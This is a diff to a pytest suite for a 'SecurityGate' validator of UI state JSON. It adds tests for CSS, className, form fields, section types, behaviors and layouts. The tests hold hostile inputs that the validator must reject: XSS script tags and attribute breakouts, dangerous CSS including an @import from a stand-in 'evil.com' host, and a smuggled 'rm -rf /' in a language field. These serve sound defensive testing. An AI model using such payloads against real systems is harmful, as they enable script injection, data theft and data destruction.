@@ -501,8 +501,8 @@ class TestPayloadSizeLimits:
     @pytest.mark.mitre_t1499
     def test_nesting_depth_exceeds_limit(self, gate):
         """Deeply nested JSON should be rejected to prevent stack overflow."""
-        nested = {"status": "ready"}
-        inner = nested
+        nested = {"status": "ready", "data": {}}
+        inner = nested["data"]
         for _ in range(gate.MAX_NESTING_DEPTH + 5):
             inner["nested"] = {}
             inner = inner["nested"]
@@ -514,10 +514,10 @@ class TestPayloadSizeLimits:
     @pytest.mark.llm10
     def test_nesting_at_exact_max_depth(self, gate):
         """Nesting at exactly max depth should pass."""
-        nested = {"status": "ready"}
-        inner = nested
-        # Build exactly MAX_NESTING_DEPTH levels (starting from root=0)
-        for _i in range(gate.MAX_NESTING_DEPTH - 1):
+        nested = {"status": "ready", "data": {}}
+        inner = nested["data"]
+        # Build exactly MAX_NESTING_DEPTH levels (starting from root=0, data=1)
+        for _i in range(gate.MAX_NESTING_DEPTH - 2):
             inner["d"] = {}
             inner = inner["d"]
         inner["leaf"] = "ok"
@@ -1526,3 +1526,1784 @@ class TestXSSSrcdocAndXlink:
         raw = json.dumps({"status": "ready", "message": 'The srcdoc="..." attribute is dangerous'})
         ok, _, _ = gate.validate_state(raw)
         assert not ok, "srcdoc= pattern should trigger even in prose"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CSS VALIDATION (custom_css)
+# OWASP: A03 Injection, LLM05 Improper Output Handling
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestValidateCSS:
+    """Tests for SecurityGate.validate_css() — blocks dangerous CSS patterns."""
+
+    @pytest.fixture()
+    def gate(self):
+        from security_gate import SecurityGate
+
+        return SecurityGate()
+
+    # --- Dangerous CSS patterns that MUST be blocked ---
+
+    @pytest.mark.owasp_a03
+    def test_blocks_expression(self, gate):
+        ok, err = gate.validate_css("div { width: expression(alert(1)); }")
+        assert not ok
+        assert "expression" in err.lower()
+
+    @pytest.mark.owasp_a03
+    def test_blocks_moz_binding(self, gate):
+        ok, err = gate.validate_css("div { -moz-binding: url(evil.xml); }")
+        assert not ok
+        assert "-moz-binding" in err.lower() or "dangerous" in err.lower()
+
+    @pytest.mark.owasp_a03
+    def test_blocks_behavior_url(self, gate):
+        ok, err = gate.validate_css("div { behavior: url(evil.htc); }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_import(self, gate):
+        ok, err = gate.validate_css("@import url('https://evil.com/steal.css');")
+        assert not ok
+        assert "import" in err.lower()
+
+    @pytest.mark.owasp_a03
+    def test_blocks_charset(self, gate):
+        ok, err = gate.validate_css('@charset "UTF-7";')
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_namespace(self, gate):
+        ok, err = gate.validate_css("@namespace url(http://evil.com);")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_javascript_url(self, gate):
+        ok, err = gate.validate_css("div { background: url(javascript:alert(1)); }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_data_url(self, gate):
+        ok, err = gate.validate_css("div { background: url(data:text/html,<script>); }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_vbscript_url(self, gate):
+        ok, err = gate.validate_css("div { background: url(vbscript:run); }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_unicode_escape(self, gate):
+        ok, err = gate.validate_css("div { content: '\\u0041'; }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_css_hex_escape(self, gate):
+        ok, err = gate.validate_css("div { content: '\\6a'; }")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_zero_width_chars(self, gate):
+        ok, err = gate.validate_css("div { color: \u200bred; }")
+        assert not ok
+        assert "zero-width" in err.lower()
+
+    # --- Safe CSS that MUST be allowed ---
+
+    def test_allows_safe_css(self, gate):
+        ok, err = gate.validate_css(".diff-add { background: rgba(63,185,80,.15); border-left: 3px solid green; }")
+        assert ok, f"Safe CSS should pass: {err}"
+
+    def test_allows_css_variables(self, gate):
+        ok, err = gate.validate_css(".my-class { color: var(--green); background: var(--bg2); }")
+        assert ok, f"CSS variables should pass: {err}"
+
+    def test_allows_media_queries(self, gate):
+        ok, err = gate.validate_css("@media (max-width: 600px) { .item { padding: 4px; } }")
+        assert ok, f"@media should pass: {err}"
+
+    def test_allows_keyframes(self, gate):
+        ok, err = gate.validate_css("@keyframes fade { from { opacity: 0; } to { opacity: 1; } }")
+        assert ok, f"@keyframes should pass: {err}"
+
+    def test_allows_multiple_selectors(self, gate):
+        css = ".a { color: red; } .b { padding: 10px; } .c > .d { margin: 0; }"
+        ok, err = gate.validate_css(css)
+        assert ok, f"Multiple selectors should pass: {err}"
+
+    def test_allows_pseudo_classes(self, gate):
+        ok, err = gate.validate_css(".item:hover { background: #222; } .item:nth-child(2n) { opacity: .8; }")
+        assert ok, f"Pseudo-classes should pass: {err}"
+
+    def test_allows_transitions_and_transforms(self, gate):
+        ok, err = gate.validate_css(".btn { transition: all .2s; transform: scale(1.05); }")
+        assert ok, f"Transitions/transforms should pass: {err}"
+
+    # --- Size limits ---
+
+    @pytest.mark.llm10
+    def test_size_limit(self, gate):
+        big_css = "a{}" * 30000  # > 50KB
+        ok, err = gate.validate_css(big_css)
+        assert not ok
+        assert "too large" in err.lower()
+
+    def test_rejects_non_string(self, gate):
+        ok, err = gate.validate_css(42)  # type: ignore[arg-type]
+        assert not ok
+        assert "string" in err.lower()
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CLASSNAME VALIDATION
+# OWASP: A03 Injection, LLM05 Improper Output Handling
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestClassName:
+    """Tests for className validation on sections, fields, and items."""
+
+    @pytest.fixture()
+    def gate(self):
+        from security_gate import SecurityGate
+
+        return SecurityGate()
+
+    # --- Valid classNames ---
+
+    def test_valid_simple(self, gate):
+        ok, err = gate._validate_class_name("my-class", "test")
+        assert ok, f"Simple className should pass: {err}"
+
+    def test_valid_multiple_classes(self, gate):
+        ok, err = gate._validate_class_name("owg-diff-add owg-mono", "test")
+        assert ok, f"Multiple classes should pass: {err}"
+
+    def test_valid_with_underscores(self, gate):
+        ok, err = gate._validate_class_name("my_custom_class", "test")
+        assert ok, f"Underscores should pass: {err}"
+
+    def test_empty_is_fine(self, gate):
+        ok, err = gate._validate_class_name("", "test")
+        assert ok, "Empty className should pass"
+
+    # --- Invalid classNames ---
+
+    @pytest.mark.owasp_a03
+    def test_blocks_angle_brackets(self, gate):
+        ok, err = gate._validate_class_name("<script>alert(1)</script>", "test")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_quotes(self, gate):
+        ok, err = gate._validate_class_name('class" onclick="alert(1)', "test")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_semicolons(self, gate):
+        ok, err = gate._validate_class_name("a; background: red", "test")
+        assert not ok
+
+    @pytest.mark.owasp_a03
+    def test_blocks_curly_braces(self, gate):
+        ok, err = gate._validate_class_name("a { color: red }", "test")
+        assert not ok
+
+    def test_blocks_starting_with_number(self, gate):
+        ok, err = gate._validate_class_name("123abc", "test")
+        assert not ok
+
+    def test_blocks_too_long(self, gate):
+        ok, err = gate._validate_class_name("a" * 501, "test")
+        assert not ok
+        assert "too long" in err.lower()
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# CUSTOM CSS + CLASSNAME IN FULL STATE VALIDATION
+# OWASP: A03 Injection, LLM05 Improper Output Handling
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestCustomCSSInState:
+    """Tests for custom_css and className flowing through validate_state()."""
+
+    @pytest.fixture()
+    def gate(self):
+        from security_gate import SecurityGate
+
+        return SecurityGate()
+
+    def test_state_with_safe_custom_css_passes(self, gate):
+        raw = make_state({"custom_css": ".diff-add { background: green; }"})
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, f"State with safe custom_css should pass: {err}"
+
+    @pytest.mark.owasp_a03
+    def test_state_with_dangerous_custom_css_rejected(self, gate):
+        raw = make_state({"custom_css": "@import url('https://evil.com');"})
+        ok, err, _ = gate.validate_state(raw)
+        assert not ok
+        assert "custom_css" in err
+
+    def test_state_with_section_classname_passes(self, gate):
+        raw = make_state(
+            {
+                "data": {
+                    "ui": {
+                        "sections": [
+                            {
+                                "type": "items",
+                                "title": "Files",
+                                "className": "owg-compact owg-zebra",
+                                "items": [{"title": "file.ts"}],
+                            }
+                        ]
+                    }
+                }
+            }
+        )
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, f"Section className should pass: {err}"
+
+    @pytest.mark.owasp_a03
+    def test_state_with_invalid_section_classname_rejected(self, gate):
+        raw = make_state(
+            {
+                "data": {
+                    "ui": {
+                        "sections": [
+                            {
+                                "type": "text",
+                                "content": "hi",
+                                "className": "<script>alert(1)</script>",
+                            }
+                        ]
+                    }
+                }
+            }
+        )
+        ok, err, _ = gate.validate_state(raw)
+        assert not ok
+        assert "className" in err
+
+    def test_state_with_item_classname_passes(self, gate):
+        raw = make_state(
+            {
+                "data": {
+                    "ui": {
+                        "sections": [
+                            {
+                                "type": "items",
+                                "title": "Diff",
+                                "items": [
+                                    {"title": "+ added", "className": "owg-diff-add"},
+                                    {"title": "- removed", "className": "owg-diff-remove"},
+                                ],
+                            }
+                        ]
+                    }
+                }
+            }
+        )
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, f"Item className should pass: {err}"
+
+    def test_state_with_field_classname_passes(self, gate):
+        raw = make_state(
+            {
+                "data": {
+                    "ui": {
+                        "sections": [
+                            {
+                                "type": "form",
+                                "fields": [
+                                    {
+                                        "key": "code",
+                                        "type": "static",
+                                        "label": "Code",
+                                        "value": "x = 1",
+                                        "className": "owg-mono",
+                                    }
+                                ],
+                            }
+                        ]
+                    }
+                }
+            }
+        )
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, f"Field className should pass: {err}"
+
+    @pytest.mark.owasp_a03
+    def test_state_with_invalid_item_classname_rejected(self, gate):
+        raw = make_state(
+            {
+                "data": {
+                    "ui": {
+                        "sections": [
+                            {
+                                "type": "items",
+                                "items": [
+                                    {"title": "test", "className": 'a" onclick="alert(1)'},
+                                ],
+                            }
+                        ]
+                    }
+                }
+            }
+        )
+        ok, err, _ = gate.validate_state(raw)
+        assert not ok
+        assert "className" in err
+
+    def test_custom_css_not_scanned_by_xss(self, gate):
+        """custom_css is validated by validate_css(), not by XSS scanner.
+        This ensures CSS containing e.g. angle-bracket-like patterns in comments
+        doesn't trigger the HTML XSS scanner."""
+        # This CSS is safe but would trigger XSS scanner if scanned as HTML
+        raw = make_state({"custom_css": ".my-class { color: red; } /* valid css */"})
+        ok, err, _ = gate.validate_state(raw)
+        assert ok, f"Safe custom_css should not be blocked by XSS scanner: {err}"
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — Field Validation Properties
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestFieldValidation:
+    """Tests for field validation props: required, pattern, minLength, maxLength, etc."""
+
+    def test_required_bool_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "name", "type": "text", "label": "Name", "required": True}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_required_non_bool_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "name", "type": "text", "label": "Name", "required": "yes"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "required" in err
+
+    def test_pattern_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "email", "type": "text", "label": "Email", "pattern": "^[^@]+@[^@]+$"}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_pattern_xss_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "x", "type": "text", "label": "X", "pattern": "<script>alert(1)</script>"}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_pattern_too_long_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "type": "text", "label": "X", "pattern": "a" * 501}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "pattern" in err
+
+    def test_minLength_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [{"type": "form", "fields": [{"key": "pw", "type": "text", "label": "PW", "minLength": 8}]}]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_minLength_negative_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "pw", "type": "text", "label": "PW", "minLength": -1}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "minLength" in err
+
+    def test_maxLength_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "pw", "type": "text", "label": "PW", "maxLength": 100}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_min_max_number_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "age", "type": "number", "label": "Age", "min": 0, "max": 150}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_min_non_number_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "age", "type": "number", "label": "Age", "min": "zero"}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "min" in err
+
+    def test_errorMessage_valid(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [{"key": "x", "type": "text", "label": "X", "errorMessage": "Required field"}],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_errorMessage_xss_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "form",
+                        "fields": [
+                            {"key": "x", "type": "text", "label": "X", "errorMessage": "<script>alert(1)</script>"}
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_errorMessage_too_long_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "form", "fields": [{"key": "x", "type": "text", "label": "X", "errorMessage": "x" * 501}]}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "errorMessage" in err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — New Section Types
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestProgressSection:
+    """Tests for the progress section type."""
+
+    def test_valid_progress(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "progress",
+                        "title": "Build",
+                        "tasks": [
+                            {"label": "Unit tests", "status": "completed"},
+                            {"label": "Lint", "status": "in_progress"},
+                        ],
+                        "percentage": 50,
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_invalid_task_status(self, gate):
+        state = {"data": {"sections": [{"type": "progress", "tasks": [{"label": "Test", "status": "running"}]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "status" in err
+
+    def test_percentage_out_of_range(self, gate):
+        state = {"data": {"sections": [{"type": "progress", "tasks": [], "percentage": 150}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "percentage" in err
+
+    def test_percentage_negative(self, gate):
+        state = {"data": {"sections": [{"type": "progress", "tasks": [], "percentage": -10}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_too_many_tasks(self, gate):
+        tasks = [{"label": f"t{i}", "status": "pending"} for i in range(501)]
+        state = {"data": {"sections": [{"type": "progress", "tasks": tasks}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "too many tasks" in err
+
+    def test_all_valid_task_statuses(self, gate):
+        for s in gate.ALLOWED_TASK_STATUSES:
+            state = {"data": {"sections": [{"type": "progress", "tasks": [{"label": "T", "status": s}]}]}}
+            ok, err, _ = gate.validate_state(json.dumps(state))
+            assert ok, f"Task status {s!r} should be valid: {err}"
+
+
+class TestLogSection:
+    """Tests for the log section type."""
+
+    def test_valid_log(self, gate):
+        state = {"data": {"sections": [{"type": "log", "title": "Build", "lines": ["line1", "line2", "line3"]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_too_many_lines(self, gate):
+        lines = [f"line {i}" for i in range(5001)]
+        state = {"data": {"sections": [{"type": "log", "lines": lines}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "too many log lines" in err
+
+    def test_maxLines_valid(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": [], "maxLines": 1000}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_maxLines_out_of_range(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": [], "maxLines": 10001}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "maxLines" in err
+
+    def test_maxLines_zero(self, gate):
+        state = {"data": {"sections": [{"type": "log", "lines": [], "maxLines": 0}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+
+class TestDiffSection:
+    """Tests for the diff section type."""
+
+    def test_valid_diff(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "diff",
+                        "title": "Changes",
+                        "content": "--- a/foo.py\n+++ b/foo.py\n@@ -1,3 +1,3 @@\n-old\n+new\n context",
+                        "language": "python",
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_invalid_language(self, gate):
+        state = {"data": {"sections": [{"type": "diff", "content": "+new", "language": "python; rm -rf /"}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "language" in err
+
+    def test_language_with_valid_chars(self, gate):
+        for lang in ["python", "javascript", "c-sharp", "type_script"]:
+            state = {"data": {"sections": [{"type": "diff", "content": "+x", "language": lang}]}}
+            ok, err, _ = gate.validate_state(json.dumps(state))
+            assert ok, f"Language {lang!r} should be valid: {err}"
+
+
+class TestTableSection:
+    """Tests for the table section type."""
+
+    def test_valid_table(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "table",
+                        "columns": [{"key": "name", "label": "Name"}, {"key": "status", "label": "Status"}],
+                        "rows": [{"name": "test1", "status": "pass"}],
+                        "selectable": True,
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_too_many_columns(self, gate):
+        cols = [{"key": f"c{i}", "label": f"Col {i}"} for i in range(51)]
+        state = {"data": {"sections": [{"type": "table", "columns": cols, "rows": []}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "too many columns" in err
+
+    def test_too_many_rows(self, gate):
+        rows = [{"c": f"v{i}"} for i in range(501)]
+        state = {"data": {"sections": [{"type": "table", "columns": [{"key": "c", "label": "C"}], "rows": rows}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "too many rows" in err
+
+    def test_invalid_column_key(self, gate):
+        state = {"data": {"sections": [{"type": "table", "columns": [{"key": "", "label": "Bad"}], "rows": []}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "key" in err
+
+    def test_selectable_non_bool_rejected(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {"type": "table", "columns": [{"key": "c", "label": "C"}], "rows": [], "selectable": "yes"}
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "selectable" in err
+
+
+class TestTabsSection:
+    """Tests for the tabs section type."""
+
+    def test_valid_tabs(self, gate):
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "tabs",
+                        "tabs": [
+                            {"id": "overview", "label": "Overview", "sections": [{"type": "text", "content": "Hello"}]},
+                            {
+                                "id": "details",
+                                "label": "Details",
+                                "sections": [{"type": "form", "fields": [{"key": "x", "type": "text", "label": "X"}]}],
+                            },
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_too_many_tabs(self, gate):
+        tabs = [{"id": f"t{i}", "label": f"Tab {i}", "sections": []} for i in range(21)]
+        state = {"data": {"sections": [{"type": "tabs", "tabs": tabs}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "too many tabs" in err
+
+    def test_invalid_tab_id(self, gate):
+        state = {"data": {"sections": [{"type": "tabs", "tabs": [{"id": "tab with spaces", "label": "Bad"}]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "id" in err
+
+    def test_nested_sections_validated(self, gate):
+        """XSS inside nested tab sections must be caught."""
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "tabs",
+                        "tabs": [
+                            {
+                                "id": "t1",
+                                "label": "Tab",
+                                "sections": [{"type": "text", "content": "<script>alert(1)</script>"}],
+                            }
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_nested_invalid_field_type_caught(self, gate):
+        """Invalid field types inside tabs must be caught."""
+        state = {
+            "data": {
+                "sections": [
+                    {
+                        "type": "tabs",
+                        "tabs": [
+                            {
+                                "id": "t1",
+                                "label": "Tab",
+                                "sections": [
+                                    {"type": "form", "fields": [{"key": "x", "type": "INVALID", "label": "X"}]}
+                                ],
+                            }
+                        ],
+                    }
+                ]
+            }
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — Behaviors
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestBehaviors:
+    """Tests for client-side behavior rules validation."""
+
+    def test_valid_behaviors(self, gate):
+        state = {
+            "behaviors": [
+                {"when": {"field": "type", "equals": "custom"}, "show": ["custom_name"]},
+                {"when": {"field": "confirm", "checked": True}, "enable": ["submit_btn"]},
+            ]
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_all_conditions_valid(self, gate):
+        for cond in gate.ALLOWED_BEHAVIOR_CONDITIONS:
+            value = "x" if cond in ("equals", "notEquals", "matches") else True
+            if cond in ("in", "notIn"):
+                value = ["a"]
+            state = {"behaviors": [{"when": {"field": "f", cond: value}, "show": ["target"]}]}
+            ok, err, _ = gate.validate_state(json.dumps(state))
+            assert ok, f"Condition {cond!r} should be valid: {err}"
+
+    def test_invalid_condition_rejected(self, gate):
+        state = {"behaviors": [{"when": {"field": "f", "greaterThan": 5}, "show": ["target"]}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "invalid condition" in err
+
+    def test_missing_field_rejected(self, gate):
+        state = {"behaviors": [{"when": {"equals": "x"}, "show": ["target"]}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_missing_effect_rejected(self, gate):
+        state = {"behaviors": [{"when": {"field": "f", "equals": "x"}}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "needs at least one effect" in err
+
+    def test_matches_xss_rejected(self, gate):
+        state = {"behaviors": [{"when": {"field": "f", "matches": "<script>alert(1)</script>"}, "show": ["t"]}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_matches_too_long_rejected(self, gate):
+        state = {"behaviors": [{"when": {"field": "f", "matches": "a" * 501}, "show": ["t"]}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_too_many_behaviors(self, gate):
+        behaviors = [{"when": {"field": f"f{i}", "equals": "x"}, "show": [f"t{i}"]} for i in range(101)]
+        state = {"behaviors": behaviors}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "Too many behaviors" in err
+
+    def test_invalid_effect_target_rejected(self, gate):
+        state = {"behaviors": [{"when": {"field": "f", "equals": "x"}, "show": ["invalid key!"]}]}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "invalid target" in err
+
+    def test_all_effects_valid(self, gate):
+        for effect in gate.ALLOWED_BEHAVIOR_EFFECTS:
+            state = {"behaviors": [{"when": {"field": "f", "equals": "x"}, effect: ["target"]}]}
+            ok, err, _ = gate.validate_state(json.dumps(state))
+            assert ok, f"Effect {effect!r} should be valid: {err}"
+
+    def test_behaviors_non_list_rejected(self, gate):
+        state = {"behaviors": "not a list"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "behaviors must be an array" in err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — Layout Validation
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestLayout:
+    """Tests for layout and panels validation."""
+
+    def test_valid_sidebar_layout(self, gate):
+        state = {
+            "layout": {"type": "sidebar", "sidebarWidth": "300px"},
+            "panels": {
+                "sidebar": {"sections": [{"type": "text", "content": "Nav"}]},
+                "main": {"sections": [{"type": "form", "fields": [{"key": "x", "type": "text", "label": "X"}]}]},
+            },
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_valid_split_layout(self, gate):
+        state = {
+            "layout": {"type": "split"},
+            "panels": {
+                "left": {"sections": [{"type": "text", "content": "Left"}]},
+                "right": {"sections": [{"type": "text", "content": "Right"}]},
+            },
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_invalid_layout_type(self, gate):
+        state = {"layout": {"type": "grid"}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "layout.type" in err
+
+    def test_invalid_sidebarWidth(self, gate):
+        state = {"layout": {"type": "sidebar", "sidebarWidth": "300"}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "sidebarWidth" in err
+
+    def test_valid_sidebarWidth_units(self, gate):
+        for w in ["300px", "20em", "15rem", "25%"]:
+            state = {"layout": {"type": "sidebar", "sidebarWidth": w}}
+            ok, err, _ = gate.validate_state(json.dumps(state))
+            assert ok, f"Width {w!r} should be valid: {err}"
+
+    def test_invalid_panel_key(self, gate):
+        state = {
+            "layout": {"type": "sidebar"},
+            "panels": {"top": {"sections": []}},
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "invalid key" in err
+
+    def test_panel_xss_caught(self, gate):
+        """XSS in panel sections must be caught."""
+        state = {
+            "layout": {"type": "sidebar"},
+            "panels": {
+                "main": {"sections": [{"type": "text", "content": "<script>alert(1)</script>"}]},
+            },
+        }
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+
+    def test_layout_non_object_rejected(self, gate):
+        state = {"layout": "sidebar"}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "layout must be an object" in err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — Section & Item IDs
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestSectionAndItemIds:
+    """Tests for section id and item id validation."""
+
+    def test_valid_section_id(self, gate):
+        state = {"data": {"sections": [{"type": "text", "id": "summary", "content": "Hi"}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_invalid_section_id(self, gate):
+        state = {"data": {"sections": [{"type": "text", "id": "bad id!", "content": "Hi"}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "id" in err
+
+    def test_valid_item_id(self, gate):
+        state = {"data": {"sections": [{"type": "items", "items": [{"id": "item-1", "title": "Test"}]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert ok, err
+
+    def test_item_id_too_long(self, gate):
+        state = {"data": {"sections": [{"type": "items", "items": [{"id": "x" * 501, "title": "Test"}]}]}}
+        ok, err, _ = gate.validate_state(json.dumps(state))
+        assert not ok
+        assert "id" in err
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# V2 FEATURES — Action Context
+# ═══════════════════════════════════════════════════════════════════════════════
+
+
+class TestActionContext:
+    """Tests for action context validation."""
+
+    def test_action_with_context(self, gate):
+        action = {
+            "action_id": "approve",
+            "type": "approve",
+            "value": True,
+            "context": {"item_index": 0, "section_id": "issues"},
+        }
+        ok, err = gate.validate_action(action)
+        assert ok, err
+
+    def test_action_context_non_object_rejected(self, gate):
+        action = {
+            "action_id": "approve",
+            "type": "approve",
+            "value": True,
+            "context": "not an object",
+        }
+        ok, err = gate.validate_action(action)
+        assert not ok
+        assert "context" in err
+
+    def test_action_context_too_large_rejected(self, gate):
+        action = {
+            "action_id": "approve",
+            "type": "approve",
+            "value": True,
+            "context": {"data": "x" * 11000},
+        }
+        ok, err = gate.validate_action(action)
+        assert not ok
+        assert "context too large" in err
+
+    def test_action_without_context_valid(self, gate):
+        action = {"action_id": "ok", "type": "confirm", "value": True}
+        ok, err = gate.validate_action(action)
+        assert ok, err
+
+
